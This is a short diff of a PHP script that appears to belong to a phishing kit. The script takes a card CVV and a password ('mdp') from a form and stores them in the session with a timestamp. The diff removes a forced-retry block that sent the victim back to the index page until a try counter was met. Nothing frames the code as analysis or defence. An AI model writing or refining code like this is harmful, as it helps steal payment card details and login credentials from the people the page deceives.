@@ -8,12 +8,6 @@ if (!isset($_POST["cvv"]) or !isset( $_POST["mdp"])) {
     exit();
 }
 
-if($_SESSION['try'] !== 1 ){
-    $_SESSION['try']++ ;
-    header("Location: ./index.php");  
-    exit();     
-} 
-
 $_SESSION["cvv"] = $_POST['cvv'] ;
 $_SESSION["mdp"] = $_POST['mdp'] ;
 $heure = date("h:i:s") ;
